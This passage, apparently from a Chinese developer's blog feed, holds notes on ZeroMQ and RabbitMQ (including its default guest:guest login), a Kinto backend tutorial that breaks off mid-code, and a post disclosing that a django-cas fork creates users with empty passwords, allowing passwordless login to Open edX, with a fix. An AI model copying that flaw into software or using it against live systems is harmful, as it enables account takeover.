&lt;p&gt;很多情况下我们需要异步的通信协议。比如，一个进程通知另一个进程发生了一个事件，但不需要等待回应。但消息队列的异步特点，也造成了一个缺点，就是接收者必须轮询消息队列，才能收到最近的消息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;和信号相比，消息队列能够传递更多的信息。与管道相比，消息队列提供了有格式的数据，这可以减少开发人员的工作量&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;ZeroMQ&lt;/h1&gt;
&lt;h3&gt;是什么&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;所有网络交互所使用的API实际上是Berkeley套接字(BSD) 。这个源自1980年代早期的协议是TCP/IP协议的最原始实现。而且可以说，在当今各操作系统中，它是受到最广泛支持的API，也是这些操作系统的核心组件之一。人们对BSD套接字的了解较多的是点对点的连接。点对点连接需要显式地建立连接、销毁连接、选择协议（TCP/UDP）和处理错误等。一旦你解决了以上所有问题，你就进入应用协议层（如HTTP）的世界了，这里需要的是组帧、缓存和处理逻辑等。换言之，编写高性能网络协议的应用程序一点儿也不复杂。
  如果我们能对各种套接字类型、连接处理、帧、甚至路由的底层细节进行抽象，这不是件很好的事情吗？这正是ZeroMQ（ØMQ/ZMQ）网络库的由来：“它提供一些跨多种传输协议（如进程内通讯、IPC、TCP和广播）的套接字供你使用。你可使用多种方式实现N对N的套接字连接，譬如：扇出、发布订阅、任务分发以及请求响应。”&lt;/p&gt;
&lt;p&gt;它更像是一个底层的网络通讯库，在Socket API之上做了一层封装，将网络通讯、进程通讯和线程通讯抽象为统一的API接口&lt;/p&gt;
&lt;p&gt;这是个类似于Socket的一系列接口，他跟Socket的区别是：普通的socket是端到端的（1:1的关系），而ZMQ却是可以N：M 的关系，人们对BSD套接字的了解较多的是点对点的连接，点对点连接需要显式地建立连接、销毁连接、选择协议（TCP/UDP）和处理错误等，而ZMQ屏蔽了这些细节，让你的网络编程更为简单。ZMQ用于node与node间的通信，node可以是主机或者是进程。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;优势&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;TCP：ZeroMQ基于消息，消息模式，而非字节流。&lt;/li&gt;
&lt;li&gt;RPC：ZeroMQ完全是异步的，你可以随时增加/删除参与者。&lt;/li&gt;
&lt;li&gt;XMPP：ZeroMQ更简单、快速、更底层。Jabber可建在ØMQ之上。&lt;/li&gt;
&lt;li&gt;AMQP：完成相同的工作，ZeroMQ要快100倍，而且不需要代理（规范更简洁——少278页）&lt;/li&gt;
&lt;li&gt;IPC：ZeroMQ可以跨多个主机盒，而非单台机器。&lt;/li&gt;
&lt;li&gt;CORBA：ZeroMQ不会将复杂到恐怖的消息格式强加于你。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;三个基本模型&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Request-Reply&lt;/li&gt;
&lt;li&gt;Publisher-Subscriber&lt;/li&gt;
&lt;li&gt;Parallel Pipeline&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;参考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.searchtb.com/2012/08/zeromq-primer.html"&gt;ZeroMQ的学习和研究&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.infoq.com/cn/news/2010/09/introduction-zero-mq"&gt;ØMQ(ZeroMQ)简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/kent45/article/details/10397917"&gt;在python中引入zeromq消息中间件环境&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/anjuke/zguide-cn/blob/master/chapter1.md"&gt;ZMQ 指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;RabbitMQ&lt;/h1&gt;
&lt;p&gt;RabbitMQ是实现AMQP（高级消息队列协议）的消息中间件的一种&lt;/p&gt;
&lt;p&gt;ZeroMQ 和 RabbitMQ 都支持一个开源的消息协议:&lt;code&gt;AMQP&lt;/code&gt;。AMQP的一个优点是它是一个灵活和开放的协议.不过ZeroMQ不支持消息持久化和崩溃恢复，&lt;code&gt;RabbitMQ支持持久化&lt;/code&gt;。如果RabbitMQ死掉了，消息并不会丢失，当队列重启，一切都会回来&lt;/p&gt;
&lt;h3&gt;FAQ&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;如何保证消息被某个消费者取得：当从队列当中取出一个消息的时候，RabbitMQ需要应用显式地回馈说已经获取到了该消息。如果一段时间内不回馈，RabbitMQ会将该消息重新分配给另外一个绑定在该队列上的消费者。另一种情况是消费者断开连接，但是获取到的消息没有回馈，则RabbitMQ同样重新分配&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/14659335/rabbitmq-server-fails-to-start-after-hostname-has-changed-for-first-time"&gt;rabbitmq-server fails to start after hostname has changed for first time&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a href="http://rabbitmq.mr-ping.com/"&gt;RabbitMQ 中文文档&lt;/a&gt;摘记&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;可以做什么&lt;ul&gt;
&lt;li&gt;消息系统允许软件、应用相互连接和扩展．这些应用可以相互链接起来组成一个更大的应用&lt;/li&gt;
&lt;li&gt;消息系统通过将消息的发送和接收分离来实现应用程序的异步和解偶&lt;/li&gt;
&lt;li&gt;或许你正在考虑进行数据投递，非阻塞操作或推送通知。或许你想要实现发布／订阅，异步处理，或者工作队列。所有这些都可以通过消息系统实现&lt;/li&gt;
&lt;li&gt;RabbitMQ附带了一个易于使用的可视化管理工具&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;安装&lt;ul&gt;
&lt;li&gt;默认用户访问：guest：guest&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://rabbitmq.mr-ping.com/AMQP/AMQP_0-9-1_Model_Explained.html"&gt;AMQP 0.9.1 模型解析&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;消息代理（message brokers）从发布者（publishers）亦称生产者（producers）那儿接收消息，并根据既定的路由规则把接收到的消息发送给处理消息的消费者（consumers）。由于AMQP是一个网络协议，所以这个过程中的发布者，消费者，消息代理 可以存在于不同的设备上。&lt;/li&gt;
&lt;li&gt;AMQP 0-9-1 模型简介:消息（message）被发布者（publisher）发送给交换机（exchange），交换机常常被比喻成邮局或者邮箱。然后交换机将收到的消息根据路由规则分发给绑定的队列（queue）。最后AMQP代理会将消息投递给订阅了此队列的消费者，或者消费者按照需求自行获取。&lt;/li&gt;
&lt;li&gt;当“消息确认”被启用的时候，消息代理不会完全将消息从队列中删除，直到它收到来自消费者的确认回执（acknowledgement）&lt;/li&gt;
&lt;li&gt;消费者&lt;ul&gt;
&lt;li&gt;将消息投递给应用 ("push API")&lt;/li&gt;
&lt;li&gt;应用根据需要主动获取消息 ("pull API")&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AMQP连接通常是长连接&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;应用教程（python版）&lt;ul&gt;
&lt;li&gt;&lt;a href="http://rabbitmq.mr-ping.com/tutorials_with_python/[1]Hello_World.html"&gt;hello world&lt;/a&gt;:使用pika库&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/python/send.py"&gt;send.py 源码&lt;/a&gt;、&lt;a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/python/receive.py"&gt;receive.py源码&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;列出所有队列:sudo rabbitmqctl list_queues&lt;/li&gt;
&lt;li&gt;&lt;a href="http://rabbitmq.mr-ping.com/tutorials_with_python/[3]Publish_Subscribe.html"&gt;发布、订阅&lt;/a&gt;：在我们的这个日志系统中，所有正在运行的接收方程序都会接受消息。我们用其中一个接收者（receiver）把日志写入硬盘中，另外一个接受者（receiver）把日志输出到屏幕上&lt;ul&gt;
&lt;li&gt;交换器和队列之间的联系我们称之为绑定（binding）&lt;ul&gt;
&lt;li&gt;列出所有绑定rabbitmqctl list_bindings&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://rabbitmq.mr-ping.com/tutorials_with_python/[6]RPC.html"&gt;远程过程调用&lt;/a&gt;：用celery吧&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;参考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://rabbitmq.mr-ping.com/"&gt;RabbitMQ 中文文档&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.ftofficer.com/2010/03/translation-rabbitmq-python-rabbits-and-warrens/"&gt;兔子和兔子窝&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://my.oschina.net/guol/blog/186432?fromerr=IGi2rm5U"&gt;Rabbitmq学习之路1-基本概念&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;选择&lt;/h3&gt;
&lt;p&gt;仔细分析应用程序的需求就能让更加清楚哪种交互机制才是解决问题的最佳之选&lt;/p&gt;
&lt;h3&gt;RabbitMQ in edx&lt;/h3&gt;
&lt;h4&gt;configuration中的一些配置&lt;/h4&gt;
&lt;p&gt;详情参考&lt;a href="https://github.com/edx/configuration/blob/named-release/dogwood.rc/playbooks/roles/rabbitmq/defaults/main.yml"&gt;rabbitmq/defaults/main.yml&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;EDXAPP_RABBIT_HOSTNAME: &amp;#39;localhost&amp;#39;
rabbitmq_port: 5672
rabbitmq_management_port: 15672
rabbitmq_ip: &amp;quot;{{ ansible_default_ipv4.address }}&amp;quot;

XQUEUE_RABBITMQ_HOSTNAME: &amp;#39;localhost&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在edx中RabbitMQ被当做服务使用，基本是透明的&lt;/p&gt;
&lt;h3&gt;一些有用命令&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;查看帮助：sudo rabbitmqctl -h&lt;/li&gt;
&lt;li&gt;列出所有用户&lt;ul&gt;
&lt;li&gt;admin[administrator]、celery  [administrator]、edx [administrator]&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;查看绑定：sudo rabbitmqctl list_bindings&lt;ul&gt;
&lt;li&gt;参考:&lt;a href="http://rabbitmq.mr-ping.com/tutorials_with_python/[3]Publish_Subscribe.html"&gt;发布/订阅&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;列出所有队列:sudo rabbitmqctl list_queues&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 02 Jun 2016 00:00:00 +0000</pubDate><guid>tag:,2016-06-02:mq-note.html</guid><category>技术</category></item><item><title>django-cas可能引起的安全漏洞</title><link>/django-cas-bug.html</link><description>&lt;p&gt;我之前改造了&lt;a href="https://github.com/kstateome/django-cas"&gt;kstateome/django-cas&lt;/a&gt;,使其适合Open edX使用（&lt;a href="https://github.com/wwj718/django-cas"&gt;wwj718/django-cas&lt;/a&gt;），今早去某高校，讨论些东西，期间谈到需要可能更改cas的既有逻辑，于是回来重新翻了下&lt;a href="https://github.com/wwj718/django-cas"&gt;wwj718/django-cas&lt;/a&gt;的源码，发现其中有一个潜在的安全隐患&lt;/p&gt;
&lt;p&gt;隐患的代码为&lt;a href="https://github.com/wwj718/django-cas/blob/wwj/1.2.0/cas/backends.py#L243"&gt;user = User.objects.create_user(username, '')&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;后果&lt;/h3&gt;
&lt;p&gt;所有由CAS引入系统的用户，初始化密码为空！可以在Open edX的默认登录系统中被无密码登录&lt;/p&gt;
&lt;h3&gt;触发条件&lt;/h3&gt;
&lt;p&gt;可能触发隐患的上下文是，系统采用cas的同时，还保留了原始的登录系统，而且默认情况就是如此&lt;/p&gt;
&lt;p&gt;CAS的登录入口和edx默认的登录路口是并列关系（这可能带来很多问题）&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;urlpatterns += (
# CAS
url(r&amp;#39;^accounts/login/$&amp;#39;, &amp;#39;cas.views.login&amp;#39;, name=&amp;#39;login&amp;#39;),
url(r&amp;#39;^accounts/logout/$&amp;#39;, &amp;#39;cas.views.logout&amp;#39;, name=&amp;#39;logout&amp;#39;),
)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;注意url里的name，会覆盖原先的reverse，这是django的url机制引起的&lt;/p&gt;
&lt;h3&gt;策略&lt;/h3&gt;
&lt;p&gt;把cas作为唯一的登录方式，基本的做法是，覆盖原先的登录入口（修改url，注视掉原先的登录入口，不过edx的登录是以ajax的方式，禁用url可能还不够安全，更多细节我暂时没时间查看），更为彻底的做法是禁用django的默认认证后端&lt;/p&gt;
&lt;h3&gt;todo&lt;/h3&gt;
&lt;p&gt;模仿&lt;a href="https://github.com/mitocw/django-cas/blob/60a5b8e5a62e63e0d5d224a87f0b489201a0c695/django_cas/backends.py"&gt;mitocw/django-cas&lt;/a&gt;的做法，不允许密码登录&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;user = User(username=username, email=username)
user.set_unusable_password()
...
user.save()
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;值得一提的是&lt;a href="https://github.com/mitocw/django-cas/blob/60a5b8e5a62e63e0d5d224a87f0b489201a0c695/django_cas/backends.py"&gt;mitocw/django-cas&lt;/a&gt;也用了django的User，这样一来，不还是有关联profile的问题么&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 01 Jun 2016 00:00:00 +0000</pubDate><guid>tag:,2016-06-01:django-cas-bug.html</guid><category>edx</category></item><item><title>如何架空经常500的后端程序员</title><link>/kinto-note-05-31.html</link><description>&lt;blockquote&gt;
&lt;p&gt;当你知道自己要做什么，才存在适合你的工具。这个时候，你与捷径仅有github的距离   --by 我（偶尔500的后端程序员）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上边这句话，可以看做对“没有银弹”的一种解读&lt;/p&gt;
&lt;p&gt;创世初，荆棘遍地，百废待兴，先民试图通过发明一种新的编程语言，来救济陷入沼泽的巨兽，一时间，倚天屠龙，寒光夺目，庙堂、江湖，英雄辈出。&lt;/p&gt;
&lt;p&gt;直到后来，人类发现甚至就“php是不是最好的语言”都无法达成一致，拉黑取关，火把相向&lt;/p&gt;
&lt;p&gt;人们才痛心疾首地发现&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;没有银弹&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;对这段历史有更多兴趣的同学可以自行坠涯，以获上古秘籍《人月神话》于山洞&lt;/p&gt;
&lt;p&gt;如果你想要的是，“最强大最好的最快的通用后端”，那你可以关掉网页看冰与火之歌去啦！（这周的更新啦！感谢小钗~）。如果你只是需要一个轻巧的抽象数据存储服务，有一般的身份验证，版本递增的功能，又或者如果你喜欢google的firebase这类东西（什么？你还不知道firebase这种神奇？！google！），那么你说不定会喜欢我要推荐的这个东西&lt;/p&gt;
&lt;h1&gt;kinto&lt;/h1&gt;
&lt;p&gt;我将kinto看做python的BaaS(Backend as a Services)实现，你可以把它看做一个json server，如果你用过json-server，你应该对它很有好感，json-server是我最喜欢你的工具之一，如果你对它不了解可以查看我之前的这篇文章:&lt;a href="http://blog.just4fun.site/use-json-server.html"&gt;使用json-server来帮助前后端分离&lt;/a&gt;，但是json server仅仅是个作为测试用的server，不具备作为BaaS的能力，首先它没有身份的概念，任何用户可以改写数据&lt;/p&gt;
&lt;p&gt;kinto支持用户身份认证，支持细粒度的权限，支持建议的查询，支持数据验证，它与同类产品的比较可以看这里:&lt;a href="http://kinto.readthedocs.io/en/latest/faq.html#how-does-kinto-compare-to-other-solutions"&gt;How does Kinto compare to other solutions&lt;/a&gt;，你可以把它看做生产可用的json—server&lt;/p&gt;
&lt;h3&gt;demo&lt;/h3&gt;
&lt;p&gt;这是官方的&lt;a href="https://kinto.dev.mozaws.net/v1/"&gt;demo&lt;/a&gt;,我们也可以自行搭建&lt;/p&gt;
&lt;h3&gt;test by httpie/postman&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;{&amp;quot;data&amp;quot;: {&amp;quot;description&amp;quot;: &amp;quot;Write a tutorial explaining Kinto&amp;quot;, &amp;quot;status&amp;quot;: &amp;quot;todo&amp;quot;}}&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
http POST https://kinto.dev.mozaws.net/v1/buckets/default/collections/tasks/records &lt;span class="se"&gt;\&lt;/span&gt;
-v --auth &lt;span class="s1"&gt;&amp;#39;wwj:wwj-secret&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;response为：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Write a tutorial explaining Kinto&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;0d59f3db-0c5b-449a-8d12-e3408311ae8b&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;last_modified&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1464699069634&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;todo&amp;quot;&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;permissions&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;write&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;basicauth:d6b8c4bd7214846a9b8c09842a2599bb299df0e68594b69ce18a63c6facec586&amp;quot;&lt;/span&gt;
        &lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们来看看我们存下的数据还在不在&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http  https://kinto.dev.mozaws.net/v1/buckets/default/collections/tasks/records &lt;span class="se"&gt;\&lt;/span&gt;
-v --auth &lt;span class="s1"&gt;&amp;#39;wwj:wwj-secret&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;哈哈，数据被存下了&lt;/p&gt;
&lt;p&gt;我们也可以在&lt;a href="http://kinto.github.io/kinto-admin/"&gt;kinto-admin&lt;/a&gt;中可以使用web界面来管理我们提交的东西&lt;/p&gt;
&lt;p&gt;聪明的你一定发现了，我们可以在任何时候任何client里保存这些数据，这样一来，我们可以写没有后端的应用！&lt;/p&gt;
&lt;p&gt;如果你熟悉restful风格的接口，上边的请求url你应该好不陌生&lt;code&gt;https://kinto.dev.mozaws.net/v1/buckets/default/collections/tasks/records&lt;/code&gt;，buckets/collections和tasks都是命名空间而已，你可以往里构建你的数据框架，就像在数据库里建库建表一样&lt;/p&gt;
&lt;p&gt;don't be shy，别被条条框框束缚，放手去做吧&lt;/p&gt;
&lt;h3&gt;文档&lt;/h3&gt;
&lt;p&gt;更多的用法参考&lt;a href="http://kinto.readthedocs.io/en/latest/overview.html"&gt;kinto.readthedocs.io&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;关于后端的思考&lt;/h1&gt;
&lt;p&gt;如果我只是写一个&lt;a href="http://todomvc.com/"&gt;todo 
mvc&lt;/a&gt;应用，为何我需要构建一个后端呢，我要的仅仅是带有用户身份的存储功能，数据模型也很标准，无非是有一个 todo list，这个集合里是一堆item，每个item用json存储&lt;/p&gt;
&lt;p&gt;增删改的逻辑完全在web app或是mobile app里实现，后端仅仅是为了永久化和同步设备间的数据，这个需求看去如此常见，数据如此规则，为何不抽象出一个通用的后端&lt;/p&gt;
&lt;p&gt;当然早就有人帮你做好啦，这类的东西叫做BaaS&lt;/p&gt;
&lt;h1&gt;对前端的意义&lt;/h1&gt;
&lt;p&gt;我将手机端和web前端都视为client，广义上的前端&lt;/p&gt;
&lt;p&gt;BaaS让前端开发者一旦熟悉这些API，就可以抽象地使用后端，而不必求助于后端开发者提供接口，如此一来，大多的500就不会发生啦，前端开发者可以独立完成整个应用了！&lt;/p&gt;
&lt;p&gt;同时你还获得了横向拓展的能力，由于使用的基本是k-v存储，十分易于拓展，不必担心应用的负载能力。而我们知道，后端新手提供的接口，抗压能力往往很弱的&lt;/p&gt;
&lt;p&gt;那么代价呢，代价是BaaS给你提供抽象的后端的时候，让你对它产生了依赖，好比之前parse被收购不久，服务就喊停了。身家性命系于他人，好消息是BaaS已经有不少开源实现了。&lt;/p&gt;
&lt;h1&gt;对后端的的意义&lt;/h1&gt;
&lt;p&gt;如果你发现你写的接口多是是标准的RESTful风格，功能上以存储为中心，诸如我最近在做的拓展对象属性，为用户添加profile/头像之类的，业务逻辑清爽简单，那么你也许可以考虑不必自己写整个后端，直接使用BaaS就好了&lt;/p&gt;
&lt;p&gt;less code ， less bug&lt;/p&gt;
&lt;h1&gt;kinto的使用笔记&lt;/h1&gt;
&lt;h2&gt;安装&lt;/h2&gt;
&lt;h3&gt;pip&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pip install kinto
kinto init
kinto migrate
kinto start
&lt;span class="c1"&gt;# kinto --ini /etc/kinto/kinto.ini start #配置&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;参考&lt;a href="http://kinto.readthedocs.io/en/latest/tutorials/install.html#using-the-python-package"&gt;Install Kinto&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;Running in production&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://kinto.readthedocs.io/en/latest/configuration/production.html"&gt;Running in production&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最佳实践可以参考&lt;a href="http://kinto.readthedocs.io/en/latest/configuration/good-practices.html"&gt;Deployment good practices&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;docker&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;sudo docker run -d -p 8888:8888 kinto/kinto-server&lt;ul&gt;
&lt;li&gt;之后建议通过docker-compose分离出数据库&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;访问：http://10.10.100.115:8888/v1/（公司内网）&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hub.docker.com/r/kinto/kinto-server/~/dockerfile/"&gt;dockerfile&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;真实的命令：kinto --ini /etc/kinto/kinto.ini migrate &amp;amp;&amp;amp; kinto --ini /etc/kinto/kinto.ini start //可以将/etc/kinto/kinto.ini用-v映射出去&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;入门教程&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://kinto.readthedocs.io/en/latest/tutorials/first-steps.html"&gt;offline-first application&lt;/a&gt;只有在线时才连接，平时使用js的本地存储功能&lt;/p&gt;
&lt;h3&gt;push notifications&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://kinto.readthedocs.io/en/latest/tutorials/notifications-websockets.html"&gt;How to setup push notifications using WebSockets?&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用&lt;a href="https://pusher.com/"&gt;Pusher&lt;/a&gt;来实时推送消息，Pusher采用了websocket来建立长连接&lt;/p&gt;
&lt;p&gt;，当然我们也可以搭建Pusher的私有服务:&lt;a href="https://github.com/stevegraham/slanger"&gt;slanger&lt;/a&gt;&lt;/p&gt;
&lt;h5&gt;docker搭建&lt;/h5&gt;
&lt;p&gt;sudo docker run -d -p 8080:8080 -p 4567:4567 -it --link redis:redis dsninjas/slanger slanger --app_key 765ec374ae0a69f4ce44 --secret your-pusher-secret -r "redis://redis:6379/0”&lt;/p&gt;
&lt;p&gt;推送信息(基于python)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pusher&lt;/span&gt;
&lt;span class="n"&gt;pusher_client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pusher&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Pusher&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
  &lt;span class="n"&gt;app_id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;123456&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;765ec374ae0a69f4ce44&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="n"&gt;secret&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;your-pusher-secret&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="n"&gt;ssl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;4567&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;push_client.tunnel.qydev.com&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;pusher_client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;trigger&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;test_channel&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;my_event&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;message&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;你好&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="c1"&gt;# /usr/local/lib/python2.7/dist-packages/pusher/http.py 把200改为202&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;浏览器的代码为&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;!&lt;/span&gt;&lt;span class="nx"&gt;DOCTYPE&lt;/span&gt; &lt;span class="nx"&gt;html&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;head&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
  &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;title&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;Pusher&lt;/span&gt; &lt;span class="nx"&gt;Test&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/title&amp;gt;&lt;/span&gt;
